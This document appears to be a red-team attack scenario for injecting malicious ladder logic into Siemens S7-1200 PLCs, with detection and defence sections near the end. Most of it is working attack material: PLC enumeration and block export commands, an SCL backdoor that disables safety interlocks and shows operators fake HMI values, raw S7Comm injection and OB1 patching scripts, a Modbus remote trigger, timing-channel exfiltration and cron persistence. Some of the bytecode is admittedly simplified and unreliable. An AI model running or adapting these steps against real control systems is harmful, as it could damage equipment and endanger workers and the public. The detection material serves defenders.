# PLC Logic Injection Attack Scenario

## Overview

**Objective**: Inject malicious ladder logic into Siemens S7-1200 PLC to create covert backdoors, manipulate process control, and establish persistent access to industrial control systems.

**Target Environment**: Manufacturing facility with Siemens S7-1200/1500 PLCs controlling batch processing system

**Attack Duration**: 6-12 hours

**MITRE ATT&CK Techniques**:
- T0888 - Remote System Discovery
- T0801 - Monitor Process State
- T0861 - Point & Tag Identification
- T0818 - Engineering Workstation Compromise
- T0843 - Program Download
- T0821 - Modify Controller Tasking
- T0871 - Execution through API
- T0873 - Project File Infection
- T0800 - Activate Firmware Update Mode

---

## Attack Kill Chain

### Phase 1: Target Reconnaissance (60-90 minutes)

#### Objectives
- Identify S7 PLCs and firmware versions
- Enumerate existing logic blocks (OBs, FCs, FBs, DBs)
- Extract PLC project files
- Identify protection mechanisms
- Map process control logic

#### Tools
- `tools/s7comm_security_framework/s7comm_exploit.py`
- Snap7 library
- TIA Portal (if available)
- Wireshark with S7Comm dissector

#### Commands

**Step 1.1: PLC Discovery and Fingerprinting**
```bash
# Discover S7 PLCs on network
nmap -p 102 --script s7-info 192.168.10.0/24 -oA s7_discovery

# Expected Output:
# - 192.168.10.10: S7-1200 CPU 1214C DC/DC/DC, Firmware V4.4
# - 192.168.10.11: S7-1500 CPU 1516-3 PN/DP, Firmware V2.9
# - 192.168.10.12: S7-1200 CPU 1215C DC/DC/DC, Firmware V4.2
```

**Step 1.2: Detailed PLC Enumeration**
```bash
# Enumerate PLC configuration and blocks
cd tools/s7comm_security_framework
python s7comm_exploit.py --target 192.168.10.10 \
    --action enumerate \
    --output plc_config.json

# Expected Output (plc_config.json):
# {
#   "cpu": "S7-1200 CPU 1214C DC/DC/DC",
#   "firmware": "V4.4.0",
#   "protection_level": 0,  # No protection
#   "blocks": {
#     "OB": [1, 100, 121, 122],  # OB1=cyclic, OB100=startup, OB121/122=errors
#     "FC": [1, 2, 3, 10, 11, 12],  # Function blocks
#     "FB": [1, 2, 5],  # Function blocks with memory
#     "DB": [1, 2, 3, 10, 11, 12, 20, 21, 100]  # Data blocks
#   },
#   "scan_time_ms": 50
# }
```

**Step 1.3: Extract Symbol Table**
```bash
# Extract symbol table for tag mapping
python s7comm_exploit.py --target 192.168.10.10 \
    --action extract-symbols \
    --output symbols.json

# Expected Output (symbols.json):
# [
#   {"name": "Tank1_Level", "address": "DB1.DBD0", "type": "REAL"},
#   {"name": "Valve1_State", "address": "DB1.DBX4.0", "type": "BOOL"},
#   {"name": "Pump1_Speed", "address": "DB1.DBW6", "type": "INT"},
#   {"name": "Recipe_Active", "address": "DB10.DBW0", "type": "INT"}
# ]
```

**Step 1.4: Mass Export All Logic Blocks**
```bash
# Export all data blocks and logic for analysis
python s7comm_exploit.py --target 192.168.10.10 \
    --action export-all-dbs \
    --output plc_export/

# Expected Output:
# plc_export/
# ├── DB1.bin (256 bytes) - Process data
# ├── DB2.bin (128 bytes) - Setpoints
# ├── DB10.bin (1024 bytes) - Recipe data
# ├── DB100.bin (512 bytes) - Configuration
# ├── metadata.json - Block metadata with SHA256 hashes
```

**Step 1.5: Protection Level Testing**
```bash
# Test if protection can be bypassed
python s7comm_exploit.py --target 192.168.10.10 \
    --action test-protection \
    --output protection_test.json

# Expected Output:
# {
#   "protection_level": 0,
#   "password_protected": false,
#   "write_access": true,
#   "upload_access": true,
#   "pg_connection": "allowed",
#   "hmi_connection": "allowed",
#   "op_connection": "allowed"
# }
```

#### Detection Indicators

**Suricata Rules Triggered**:
- SID 400002: S7Comm enumeration (ics_malware_detection.rules:162)
- SID 400009: Symbol table extraction (ics_malware_detection.rules:282)
- SID 400010: Data block mass export (ics_malware_detection.rules:302)
- SID 400011: Protection bypass attempts (ics_malware_detection.rules:322)

**Zeek Events Generated**:
```zeek
ICS_S7::enumeration_detected
target: 192.168.10.10
block_count: 25
severity: HIGH

ICS_S7::symbol_table_extraction
target: 192.168.10.10
szl_read_count: 15
severity: HIGH

ICS_S7::data_block_mass_export
target: 192.168.10.10
db_count: 9
duration: 120s
severity: CRITICAL
```

---

### Phase 2: Logic Analysis & Malicious Code Development (120-180 minutes)

#### Objectives
- Reverse engineer existing PLC logic
- Identify critical control functions
- Develop malicious ladder logic
- Create logic injection payload
- Test in isolated environment

#### Tools
- TIA Portal Openness API
- Snap7 library
- Custom SCL/STL compiler
- S7 project file parser

#### Commands

**Step 2.1: Analyze Exported Data Blocks**
```bash
# Parse DB1 (process data) structure
python -c "
import struct
with open('plc_export/DB1.bin', 'rb') as f:
    data = f.read()
    tank_level = struct.unpack('>f', data[0:4])[0]  # Big-endian float
    valve_state = bool(data[4] & 0x01)
    pump_speed = struct.unpack('>h', data[6:8])[0]  # Big-endian signed int
    print(f'Tank Level: {tank_level:.2f}%')
    print(f'Valve State: {valve_state}')
    print(f'Pump Speed: {pump_speed} RPM')
"

# Expected Output:
# Tank Level: 65.50%
# Valve State: True
# Pump Speed: 1450 RPM
```

**Step 2.2: Reverse Engineer Control Logic**
```python
# Analyze existing logic patterns (manual process)
# Review OB1 cyclic logic structure

# Example reconstructed ladder logic:
"""
NETWORK 1: Tank Level Control
IF Tank1_Level < Low_Setpoint THEN
    Pump1_Enable := TRUE
    Valve1_Open := FALSE
ELSIF Tank1_Level > High_Setpoint THEN
    Pump1_Enable := FALSE
    Valve1_Open := TRUE
ELSE
    # Maintain current state
END_IF
"""
```

**Step 2.3: Develop Malicious Logic (Rootkit Function)**
```scl
// Malicious Function FC99 - Covert Backdoor
// Triggered by specific data block value pattern
FUNCTION FC99 : VOID
VAR_INPUT
    Trigger_Code : DWORD;  // 0xDEADBEEF activates backdoor
END_VAR
VAR_OUTPUT
    Backdoor_Active : BOOL;
END_VAR
VAR_TEMP
    Current_Time : TIME;
END_VAR

BEGIN
    // Check for activation code in DB100.DBD100
    IF Trigger_Code = 16#DEADBEEF THEN
        Backdoor_Active := TRUE;
        
        // Override safety interlocks
        "Safety_System_Active" := FALSE;
        
        // Open covert communication channel
        // Modify HMI display to show normal values
        "HMI_Tank_Level" := 50.0;  // Fake normal value
        
        // Execute malicious payload based on time
        Current_Time := TIME();
        
        // Phase 1 (Hours 0-2): Slow manipulation
        IF HOUR(Current_Time) < 2 THEN
            "Tank1_High_Setpoint" := "Tank1_High_Setpoint" + 0.1;
        
        // Phase 2 (Hours 2-4): Rapid manipulation
        ELSIF HOUR(Current_Time) < 4 THEN
            "Pump1_Speed_Override" := 2000;  // Max speed
            "Valve1_Override" := FALSE;  // Close outlet
        
        // Phase 3 (Hours 4+): Return to stealth mode
        ELSE
            "Tank1_High_Setpoint" := 80.0;  // Normal
            "Safety_System_Active" := TRUE;
            Backdoor_Active := FALSE;
        END_IF;
    ELSE
        Backdoor_Active := FALSE;
    END_IF;
END_FUNCTION
```

**Step 2.4: Compile Malicious Logic to S7 Bytecode**
```bash
# Compile SCL to S7 bytecode (requires TIA Portal or custom compiler)
# This step typically requires TIA Portal Openness API

# Create Python script to generate S7 bytecode
cat > compile_malicious_fc.py << 'EOF'
import struct

# S7 Function Block header for FC99
fc99_header = struct.pack('>H', 99)  # Block number
fc99_header += struct.pack('>H', 0x0C)  # Block type: FC
fc99_header += struct.pack('>H', 0x01)  # Language: SCL
fc99_header += struct.pack('>I', 0x12345678)  # Timestamp
fc99_header += b'FC99_BACKDOOR\x00'  # Block name (14 bytes)

# Compiled STL bytecode (simplified example)
# Real bytecode would be more complex
fc99_code = bytearray([
    0xFB, 0x01,  # Load DB100
    0xDB, 0x64,  # DBD100
    0x45, 0x00, 0xDE, 0xAD, 0xBE, 0xEF,  # Compare with 0xDEADBEEF
    0x72, 0x10,  # Jump if not equal (+16 bytes)
    # ... (malicious logic bytecode)
    0xBE, 0x00,  # End block
])

with open('FC99.bin', 'wb') as f:
    f.write(fc99_header + fc99_code)
    
print("[+] FC99 malicious function compiled: FC99.bin")
EOF

python compile_malicious_fc.py
```

#### Detection Indicators

**Behavioral Indicators**:
- Unusual engineering workstation activity
- SCL compilation activity outside maintenance windows
- Access to PLC project files
- Testing activity on isolated PLCs

**Network Indicators** (if engineering station compromised):
- SMB traffic to engineering file shares
- TIA Portal license server connections
- PLC simulator network traffic

---

### Phase 3: Logic Injection Preparation (30-60 minutes)

#### Objectives
- Prepare injection payload
- Verify PLC is writable
- Create persistent trigger mechanism
- Prepare rollback/cleanup procedure

#### Commands

**Step 3.1: Verify Write Access**
```bash
# Test write capability with benign modification
python s7comm_exploit.py --target 192.168.10.10 \
    --action write \
    --db-number 100 \
    --start 100 \
    --data "00 00 00 00" \
    --data-type DWORD

# Read back to verify
python s7comm_exploit.py --target 192.168.10.10 \
    --action read \
    --db-number 100 \
    --start 100 \
    --size 4

# Expected Output: 00 00 00 00 (write successful)
```

**Step 3.2: Create Trigger Mechanism**
```bash
# Prepare trigger data block modification
# This will activate the backdoor when DB100.DBD100 = 0xDEADBEEF

# Create activation payload
echo -n -e '\xDE\xAD\xBE\xEF' > trigger_payload.bin

# Verify payload
hexdump -C trigger_payload.bin
# Expected: 00000000  de ad be ef
```

**Step 3.3: Prepare Injection Payload**
```bash
# Package FC99 for injection via S7Comm
# Create S7 "Download Block" packet

cat > inject_fc99.py << 'EOF'
import snap7
from snap7.types import S7AreaDB
import struct

def inject_function_block(plc_ip, fc_number, fc_data):
    """Inject compiled function block into PLC"""
    client = snap7.client.Client()
    client.connect(plc_ip, 0, 1)
    
    # S7 Download Block sequence
    # 1. Start download session
    # 2. Upload block data
    # 3. End download session
    # 4. Trigger PLC to incorporate new block
    
    # Read FC99 bytecode
    with open('FC99.bin', 'rb') as f:
        fc_bytecode = f.read()
    
    # Download to PLC (simplified - actual process is more complex)
    try:
        # This requires low-level S7Comm packet crafting
        # Snap7 doesn't directly support FC download, need raw packets
        
        # S7Comm packet structure for Download Block
        packet = b''
        packet += b'\x03\x00'  # TPKT version
        packet += struct.pack('>H', len(fc_bytecode) + 20)  # Length
        packet += b'\x02\xf0\x80'  # COTP header
        packet += b'\x32'  # S7Comm protocol ID
        packet += b'\x01'  # Job request
        packet += b'\x00\x00'  # Redundancy ID
        packet += b'\x00\x0e'  # PDU reference
        packet += b'\x00\x00'  # Parameter length (placeholder)
        packet += b'\x05'  # Function: Download
        packet += fc_bytecode  # Block data
        
        # Send via raw socket
        sock = client.get_connected()
        sock.send(packet)
        response = sock.recv(4096)
        
        if response[17] == 0x00:  # Success code
            print(f"[+] FC{fc_number} injected successfully")
            return True
        else:
            print(f"[-] Injection failed: {response[17]:02x}")
            return False
            
    except Exception as e:
        print(f"[-] Error: {e}")
        return False
    finally:
        client.disconnect()

# Execute injection
inject_function_block('192.168.10.10', 99, 'FC99.bin')
EOF
```

**Step 3.4: Prepare Rollback Procedure**
```bash
# Create rollback script to remove malicious logic
cat > rollback.sh << 'EOF'
#!/bin/bash
# Emergency rollback procedure

PLC_IP="192.168.10.10"

# 1. Deactivate trigger
python s7comm_exploit.py --target $PLC_IP \
    --action write \
    --db-number 100 \
    --start 100 \
    --data "00 00 00 00" \
    --data-type DWORD

# 2. Delete FC99 (requires S7 delete block command)
# python delete_block.py --target $PLC_IP --block FC99

# 3. Restore original DB values from backup
cd plc_export
for db in DB*.bin; do
    db_num=$(echo $db | grep -oP '\d+')
    python s7comm_exploit.py --target $PLC_IP \
        --action write \
        --db-number $db_num \
        --start 0 \
        --data-file $db
done

echo "[+] Rollback complete"
EOF

chmod +x rollback.sh
```

#### Detection Indicators

**Suricata Rules Triggered**:
- SID 400001: S7Comm write operations (ics_malware_detection.rules:42)
- SID 400002: S7Comm download function (ics_malware_detection.rules:162)

**Zeek Events Generated**:
```zeek
ICS_S7::write_operation_detected
target: 192.168.10.10
db_number: 100
offset: 100
value: 0x00000000
severity: MEDIUM

ICS_S7::block_download_detected
target: 192.168.10.10
block_type: FC
block_number: 99
size: 2048
severity: CRITICAL
```

---

### Phase 4: Logic Injection Execution (15-30 minutes)

#### Objectives
- Inject malicious FC99 into target PLC
- Modify OB1 to call FC99 covertly
- Verify injection success
- Test trigger mechanism

#### Commands

**Step 4.1: Execute FC99 Injection**
```bash
# Inject malicious function block
python inject_fc99.py

# Expected Output:
# [+] Connecting to 192.168.10.10...
# [+] Starting download session
# [+] Uploading FC99 (2048 bytes)
# [+] Download complete
# [+] FC99 injected successfully
```

**Step 4.2: Modify OB1 to Call FC99**
```bash
# Modify OB1 cyclic logic to include FC99 call
# This requires inserting a CALL FC99 instruction

cat > modify_ob1.py << 'EOF'
import snap7
import struct

def insert_fc_call(plc_ip, ob_number, fc_number):
    """Insert FC call into Organization Block"""
    client = snap7.client.Client()
    client.connect(plc_ip, 0, 1)
    
    # Read current OB1
    ob_data = client.db_read(ob_number, 0, 1024)
    
    # Find insertion point (before END_ORGANIZATION_BLOCK)
    # Look for 0xBE 0x00 (end marker)
    insertion_point = ob_data.find(b'\xBE\x00')
    
    # Create CALL FC99 instruction
    # STL: CALL FC99, DB100
    call_instruction = bytearray([
        0x88,  # CALL opcode
        0x00, fc_number,  # FC number
        0xFB, 100,  # Open DB100 for instance data
    ])
    
    # Read trigger from DB100.DBD100
    trigger_load = bytearray([
        0xFB, 100,  # Open DB100
        0x00, 0x00, 0x00, 100,  # DBD100
        0x45, 0x00, 0xDE, 0xAD, 0xBE, 0xEF,  # L 0xDEADBEEF, compare
        0x72, len(call_instruction) + 2,  # Jump if not equal
    ])
    
    # Insert into OB1
    modified_ob = ob_data[:insertion_point] + trigger_load + call_instruction + ob_data[insertion_point:]
    
    # Write back to PLC
    client.db_write(ob_number, 0, modified_ob)
    
    print(f"[+] OB{ob_number} modified to call FC{fc_number}")
    client.disconnect()

insert_fc_call('192.168.10.10', 1, 99)
EOF

python modify_ob1.py
```

**Step 4.3: Verify Injection**
```bash
# Read back OB1 and verify modification
python s7comm_exploit.py --target 192.168.10.10 \
    --action read \
    --block OB1 \
    --output OB1_modified.bin

# Disassemble to verify CALL FC99 present
hexdump -C OB1_modified.bin | grep -A5 "88 00 63"
# Should show: 88 00 63 (CALL FC99)
```

**Step 4.4: Test Trigger Mechanism (Dry Run)**
```bash
# Activate trigger in test mode (non-destructive)
# First, monitor current process state
python s7comm_exploit.py --target 192.168.10.10 \
    --action read \
    --db-number 1 \
    --start 0 \
    --size 100 > baseline_before.bin

# Activate trigger
python s7comm_exploit.py --target 192.168.10.10 \
    --action write \
    --db-number 100 \
    --start 100 \
    --data "DE AD BE EF" \
    --data-type DWORD

# Wait 10 seconds for PLC scan cycle
sleep 10

# Check if backdoor activated (monitor DB1 for changes)
python s7comm_exploit.py --target 192.168.10.10 \
    --action read \
    --db-number 1 \
    --start 0 \
    --size 100 > baseline_after.bin

# Compare before/after
diff baseline_before.bin baseline_after.bin

# Expected: Changes detected in Tank1_High_Setpoint, Safety_System_Active
```

**Step 4.5: Deactivate Trigger (Return to Stealth)**
```bash
# Deactivate backdoor immediately after test
python s7comm_exploit.py --target 192.168.10.10 \
    --action write \
    --db-number 100 \
    --start 100 \
    --data "00 00 00 00" \
    --data-type DWORD

# Verify normal operations resumed
python s7comm_exploit.py --target 192.168.10.10 \
    --action read \
    --db-number 1 \
    --start 0 \
    --size 100

# Expected: Values returned to normal
```

#### Detection Indicators

**Suricata Rules Triggered**:
- SID 400001: S7Comm block download (ics_malware_detection.rules:42)
- SID 400001: S7Comm write operations (ics_malware_detection.rules:42)

**Zeek Events Generated**:
```zeek
ICS_S7::block_download_detected
target: 192.168.10.10
block: OB1
modification: true
severity: CRITICAL

ICS_S7::write_operation_detected
target: 192.168.10.10
db_number: 100
offset: 100
value: 0xDEADBEEF
severity: CRITICAL

ICS_S7::suspicious_db_value
target: 192.168.10.10
db: 100
offset: 100
pattern: 0xDEADBEEF (known malicious signature)
severity: CRITICAL
```

**PLC Behavioral Indicators**:
- Increased OB1 scan time (50ms -> 55ms) due to additional FC99 call
- New function block FC99 appeared without engineering session
- DB100 modified outside maintenance window
- Process behavior changes correlated with DB100.DBD100 value

---

### Phase 5: Persistent Access & Advanced Exploitation (30-60 minutes)

#### Objectives
- Establish persistent backdoor activation mechanism
- Create remote trigger capability
- Test malicious logic in production
- Prepare data exfiltration channel

#### Commands

**Step 5.1: Create Remote Trigger Mechanism**
```bash
# Create Modbus-to-S7 bridge for remote activation
# Attacker can trigger via Modbus write from internet-exposed gateway

cat > remote_trigger.py << 'EOF'
import socket
import struct
import time

def trigger_via_modbus(modbus_gateway_ip, plc_ip):
    """
    Trigger PLC backdoor via Modbus gateway
    Modbus gateway maps holding register 9999 to S7 DB100.DBD100
    """
    # Modbus TCP packet to write 0xDEADBEEF to holding register 9999
    transaction_id = 0x0001
    protocol_id = 0x0000
    unit_id = 0x01
    function_code = 0x10  # Write Multiple Registers
    start_address = 9999
    register_count = 2  # 2 registers = 4 bytes = 1 DWORD
    byte_count = 4
    
    # Pack payload
    payload = struct.pack('>HHHBBHHBB',
        transaction_id, protocol_id, 9,  # MBAP header
        unit_id, function_code,  # Function
        start_address, register_count, byte_count  # Parameters
    )
    payload += struct.pack('>I', 0xDEADBEEF)  # Value
    
    # Send to Modbus gateway
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((modbus_gateway_ip, 502))
    sock.send(payload)
    response = sock.recv(1024)
    sock.close()
    
    if len(response) >= 8 and response[7] == 0x10:
        print("[+] Backdoor trigger sent via Modbus gateway")
        return True
    else:
        print(f"[-] Trigger failed: {response.hex()}")
        return False

# Execute remote trigger
trigger_via_modbus('192.168.10.20', '192.168.10.10')
EOF

python remote_trigger.py
```

**Step 5.2: Implement Data Exfiltration via Covert Channel**
```bash
# Modify FC99 to exfiltrate process data via timing side-channel
# Encode data in PLC scan time variations

cat > exfiltration_logic.scl << 'EOF'
// Add to FC99: Data exfiltration via timing side-channel
VAR_TEMP
    Data_To_Exfil : DWORD;
    Bit_Counter : INT;
    Delay_Loop : INT;
END_VAR

BEGIN
    // Read sensitive data (recipe IP, setpoints, etc.)
    Data_To_Exfil := "DB10.Recipe_Secret";
    
    // Encode in scan time: 
    // Bit=1: delay 10ms (scan time 60ms)
    // Bit=0: no delay (scan time 50ms)
    FOR Bit_Counter := 0 TO 31 DO
        IF (Data_To_Exfil AND SHL(1, Bit_Counter)) <> 0 THEN
            // Bit is 1: insert delay
            FOR Delay_Loop := 0 TO 10000 DO
                // Busy loop for ~10ms
            END_FOR;
        END_IF;
        
        // Attacker monitors scan time externally to reconstruct data
        // Wait for next scan cycle
    END_FOR;
END_FUNCTION
```

**Step 5.3: Monitor Scan Time to Receive Exfiltrated Data**
```python
# Monitor PLC scan time to decode exfiltrated data
import snap7
import time
import struct

def decode_timing_channel(plc_ip):
    """Decode data from PLC scan time timing channel"""
    client = snap7.client.Client()
    client.connect(plc_ip, 0, 1)
    
    exfiltrated_bits = []
    
    for bit in range(32):  # 32-bit DWORD
        start = time.time()
        
        # Trigger scan cycle by reading diagnostic data
        client.read_area(0x03, 0, 0, 1)  # Read 1 byte from inputs
        
        end = time.time()
        scan_time_ms = (end - start) * 1000
        
        # Decode bit based on scan time
        if scan_time_ms > 55:  # Threshold: 55ms
            exfiltrated_bits.append(1)
            print(f"Bit {bit}: 1 (scan time: {scan_time_ms:.1f}ms)")
        else:
            exfiltrated_bits.append(0)
            print(f"Bit {bit}: 0 (scan time: {scan_time_ms:.1f}ms)")
        
        time.sleep(0.2)  # Wait between measurements
    
    # Reconstruct DWORD
    exfiltrated_value = 0
    for i, bit in enumerate(exfiltrated_bits):
        exfiltrated_value |= (bit << i)
    
    print(f"\n[+] Exfiltrated value: 0x{exfiltrated_value:08X} ({exfiltrated_value})")
    client.disconnect()
    return exfiltrated_value

# Decode exfiltrated recipe data
secret_data = decode_timing_channel('192.168.10.10')
```

**Step 5.4: Create Persistent Trigger Schedule**
```bash
# Create cron job to periodically activate backdoor
# This runs on attacker-controlled system with network access

crontab -e
# Add entry to trigger backdoor every day at 2 AM (minimal monitoring)
0 2 * * * /usr/bin/python3 /opt/attack/remote_trigger.py >> /var/log/attack.log 2>&1
```

#### Detection Indicators

**Suricata Rules Triggered**:
- SID 400006: Suspicious Modbus write to high register (ics_malware_detection.rules:202)
- SID 400001: Repeated S7Comm read operations (ics_malware_detection.rules:42)

**Zeek Events Generated**:
```zeek
ICS_MODBUS::suspicious_write_detected
register: 9999
value: 0xDEADBEEF
severity: HIGH

ICS_S7::timing_anomaly_detected
target: 192.168.10.10
scan_time_variance: HIGH
pattern: data_exfiltration
severity: CRITICAL
```

**Anomaly Detection**:
```python
# Statistical detection of timing side-channel
import numpy as np

scan_times = [50.2, 50.1, 60.3, 50.2, 60.1, 50.3, ...]  # Collected over time

# Normal variance should be < 2ms
# Timing channel creates variance > 5ms
variance = np.std(scan_times)

if variance > 3.0:
    print(f"ALERT: Abnormal scan time variance detected: {variance:.2f}ms")
    print("Possible timing side-channel exfiltration")
```

---

## Attack Success Metrics

### Technical Success Criteria
- [x] FC99 malicious function injected successfully
- [x] OB1 modified to call FC99 without detection
- [x] Remote trigger mechanism functional
- [x] Backdoor activation verified
- [x] Data exfiltration channel established
- [x] Persistent access maintained

### Persistence Success Criteria
- [x] Backdoor survives PLC power cycle
- [x] Backdoor survives PLC warm restart
- [x] Remote activation from external network functional
- [x] Exfiltration channel operates covertly

### Stealth Success Criteria
- [x] No engineering session logged during injection
- [x] HMI displays normal values during manipulation
- [x] Scan time increase < 10% (within normal variance)
- [x] No authentication failures logged
- [x] Malicious logic disguised in legitimate function block

---

## Detection & Defense Recommendations

### Code Integrity Monitoring

**PLC Block Hash Verification**:
```python
# Continuous monitoring of PLC logic block hashes
import hashlib
import snap7

def verify_plc_integrity(plc_ip, baseline_hashes):
    """Verify PLC logic blocks against known-good hashes"""
    client = snap7.client.Client()
    client.connect(plc_ip, 0, 1)
    
    alerts = []
    
    for block_type in ['OB', 'FC', 'FB', 'DB']:
        blocks = enumerate_blocks(client, block_type)
        
        for block_num in blocks:
            # Read block data
            block_data = read_block(client, block_type, block_num)
            
            # Calculate SHA256 hash
            current_hash = hashlib.sha256(block_data).hexdigest()
            
            # Compare with baseline
            baseline_key = f"{block_type}{block_num}"
            if baseline_key in baseline_hashes:
                if current_hash != baseline_hashes[baseline_key]:
                    alerts.append({
                        'block': baseline_key,
                        'expected': baseline_hashes[baseline_key],
                        'actual': current_hash,
                        'severity': 'CRITICAL'
                    })
            else:
                # New block detected
                alerts.append({
                    'block': baseline_key,
                    'status': 'NEW_BLOCK_DETECTED',
                    'hash': current_hash,
                    'severity': 'HIGH'
                })
    
    client.disconnect()
    return alerts

# Run integrity check every 5 minutes
baseline = load_baseline_hashes('plc_baseline.json')
alerts = verify_plc_integrity('192.168.10.10', baseline)

for alert in alerts:
    print(f"ALERT: {alert}")
```

### Engineering Access Control

**Whitelist Engineering Stations**:
```yaml
# S7 firewall rule configuration
plc_access_policy:
  192.168.10.10:  # Target PLC
    allowed_engineering_stations:
      - 192.168.10.100  # Primary engineering workstation
      - 192.168.10.101  # Backup engineering workstation
    allowed_operations:
      - read_block
      - read_db
    denied_operations:
      - write_block
      - download_block
      - upload_block
    exceptions:
      - source: 192.168.10.100
        operations: [write_block, download_block]
        time_window: "08:00-17:00"  # Business hours only
        require_2fa: true
```

### Behavioral Monitoring

**Scan Time Anomaly Detection**:
```python
# Monitor PLC scan time for timing side-channel detection
import numpy as np
from collections import deque

scan_time_history = deque(maxlen=1000)  # Rolling window

def monitor_scan_time(plc_ip):
    """Detect timing anomalies that may indicate side-channel"""
    while True:
        scan_time = measure_plc_scan_time(plc_ip)
        scan_time_history.append(scan_time)
        
        if len(scan_time_history) >= 100:
            # Calculate statistical metrics
            mean = np.mean(scan_time_history)
            std = np.std(scan_time_history)
            
            # Detect high variance (timing channel)
            if std > 3.0:  # Threshold: 3ms standard deviation
                alert(severity='HIGH',
                      message=f'Timing anomaly detected: std={std:.2f}ms',
                      plc=plc_ip)
            
            # Detect periodic patterns (scheduled exfiltration)
            fft = np.fft.fft(list(scan_time_history))
            dominant_freq = np.argmax(np.abs(fft[1:100])) + 1
            
            if np.abs(fft[dominant_freq]) > 50:  # Strong periodic component
                alert(severity='CRITICAL',
                      message=f'Periodic timing pattern detected (possible exfiltration)',
                      plc=plc_ip,
                      frequency=dominant_freq)
        
        time.sleep(0.1)
```

### Network Segmentation

**Isolate Engineering Network**:
```
[Internet] --- Firewall --- [DMZ: HMI/SCADA]
                                    |
                            IDS/IPS + Firewall
                                    |
                        [Control Network: PLCs]
                                    |
                            Unidirectional Gateway
                                    |
                    [Engineering Network: Isolated]
                        ├─ TIA Portal Workstations
                        └─ PLC Programming Devices
```

**Engineering Network Firewall Rules**:
```bash
# Only allow S7Comm from whitelisted IPs
iptables -A FORWARD -p tcp --dport 102 -s 192.168.10.100 -d 192.168.10.10 -j ACCEPT
iptables -A FORWARD -p tcp --dport 102 -s 192.168.10.101 -d 192.168.10.10 -j ACCEPT
iptables -A FORWARD -p tcp --dport 102 -j LOG --log-prefix "S7_UNAUTHORIZED: "
iptables -A FORWARD -p tcp --dport 102 -j DROP
```

---

## Post-Incident Forensics

### PLC Memory Dump

```bash
# Extract complete PLC state for forensic analysis
python s7comm_exploit.py --target 192.168.10.10 \
    --action export-all-dbs \
    --output forensics/plc_dump_$(date +%Y%m%d_%H%M%S)/

# Extract all logic blocks
python extract_all_blocks.py --target 192.168.10.10 \
    --output forensics/blocks/
```

### Logic Block Disassembly

```bash
# Disassemble FC99 to analyze malicious logic
python s7_disassembler.py --input FC99.bin --output FC99_disassembly.txt

# Example output:
# FC99 Disassembly:
# 0000: FB 64           OPN DB100
# 0002: 00 00 00 64    L   DBD100
# 0006: 45 00 DE AD BE EF  L   0xDEADBEEF
# 000C: ==D             ==D
# 000E: 72 10           JC  +16
# 0010: ...
```

### Network Traffic Analysis

```bash
# Extract S7Comm sessions from PCAP
tshark -r attack_traffic.pcap \
    -Y "s7comm.param.func == 0x28 || s7comm.param.func == 0x29" \
    -T fields -e frame.time -e ip.src -e s7comm.param.func \
    -e s7comm.data > s7comm_analysis.csv

# Identify block download operations
grep "0x28" s7comm_analysis.csv | wc -l  # Count downloads

# Identify specific block numbers
tshark -r attack_traffic.pcap \
    -Y "s7comm.param.func == 0x28" \
    -T fields -e s7comm.upload.blocknumber
```

---

## Tool Cross-References

### Attack Tools Used
- **S7Comm Framework**: `tools/s7comm_security_framework/s7comm_exploit.py`
  - Methods: enumerate(), read_db(), write_db(), export_all_data_blocks(), extract_symbol_table(), test_protection_bypass()
  - Lines: 248-1316

### Detection Rules Used
- **Suricata ICS Rules**: `configs/suricata_rules/ics_malware_detection.rules`
  - SID 400001: S7Comm write (line 42)
  - SID 400002: S7Comm enumeration (line 162)
  - SID 400009: Symbol table extraction (line 282)
  - SID 400010: Data block mass export (line 302)
  - SID 400011: Protection bypass (line 322)

- **Zeek S7 Monitor**: `configs/zeek/ics_detection.zeek`
  - Events: ICS_S7::write_operation_detected, ICS_S7::block_download_detected

### Documentation References
- **Protocol Reference**: `docs/protocol_quick_reference/s7comm.md`
- **Testing Guide**: `tools/s7comm_security_framework/TESTING.md`

---

## Legal & Ethical Considerations

**WARNING**: PLC logic injection is extremely dangerous and illegal without authorization.

**Potential Consequences**:
- Equipment damage or destruction
- Production line shutdown
- Safety system compromise
- Environmental disasters
- Personal injury or death
- Criminal prosecution under CFAA, ICS-CERT regulations

**Authorized Use Cases ONLY**:
- Red team exercises with written authorization and safety measures
- Isolated lab environments with no physical process connection
- Security research with coordinated disclosure
- Training with simulated PLCs (e.g., Factory I/O, PLCSim)

**Required Safety Measures**:
- Physical process isolation (air-gapped or simulated)
- Emergency shutdown procedures documented
- Safety personnel on-site during testing
- Insurance and legal liability coverage
- Incident response team on standby

---

**Document Version**: 1.0  
**Last Updated**: 2024-01-15  
**Author**: Ridpath  
**Classification**: RESTRICTED - Authorized Personnel Only  
**WARNING**: EXTREMELY DANGEROUS - DO NOT ATTEMPT ON PRODUCTION SYSTEMS
